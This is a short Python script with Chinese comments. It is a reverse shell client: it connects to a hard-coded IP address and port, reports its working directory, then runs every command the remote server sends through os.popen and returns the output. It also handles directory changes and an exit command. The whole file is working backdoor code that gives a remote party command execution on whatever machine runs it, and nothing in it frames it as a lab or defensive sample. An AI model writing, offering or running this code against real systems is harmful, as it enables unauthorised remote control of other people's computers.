import socket
import os

ip_port =("192.168.13.12",5757)#创建需要绑定的ip和端口
client =socket.socket()#创建套接字实例

client.connect(ip_port)#连接指定的ip和端口

while   True:#不断循环
    dir =os.getcwd()#获取当前工作目录
    client.send(dir.encode())#发送当前目录到服务器

    p =client.recv(1024).decode()#接收来自服务器的命令
    print(p)
    if p =="exit":#判断服务器是否发送退出指令
        break
    elif p.startswith("cd"):#判断服务器是否切换工作目录
        os.chdir(p[2:].strip())

    cmd =os.popen(p).read()#执行服务器命令并读取返回值
    client.send(cmd.encode())#将服务器命令执行的返回值发送给服务器
